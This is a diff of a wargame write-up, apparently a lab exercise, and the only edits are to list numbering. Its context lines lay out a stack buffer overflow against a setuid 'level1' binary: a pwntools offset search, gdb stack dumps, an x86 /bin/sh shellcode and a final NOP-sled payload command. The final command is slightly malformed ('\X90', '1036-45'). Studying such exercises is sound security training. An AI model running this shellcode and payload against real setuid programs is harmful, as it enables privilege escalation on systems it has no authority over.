@@ -65,7 +65,7 @@ level1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamic
 
 So, basically, what you have to do is overflow the 1024-bit buffer to return to an address on the stack where's an x86 shellcode that generates a shell. Let's hope that the user will be level 2 and have launched this ELF using the `setuid`.
 
-1. Find the offset of the return adress
+1- Find the offset of the return adress
 
 ```python
 from pwn import *
@@ -82,14 +82,14 @@ Program received signal SIGSEGV, Segmentation fault.
 cyclic_find(0x6b61616a)
 1036
 ```
-2. Get an x86 shellcode
+2- Get an x86 shellcode
 
 ```python
  len("\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")
 45
 ```
 
-3. Pick the return address
+3- Pick the return address
 
 ```bash
 (gdb) run `python -c 'print "A" * 1040'`
@@ -121,7 +121,7 @@ cyclic_find(0x6b61616a)
 0xffffd5d6:	0x41414141	0x41414141	0x41414141	0x41414141
 ```
 
-4. Craft the PL (e.g.: NOP + SHELLCODE + RETURNADRESS)
+4- Craft the PL (e.g.: NOP + SHELLCODE + RETURNADRESS)
 
 ```bash
 /levels/level1 `python -c 'print "\X90" * 1036-45 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xb6\xd5\xff\xff"'`
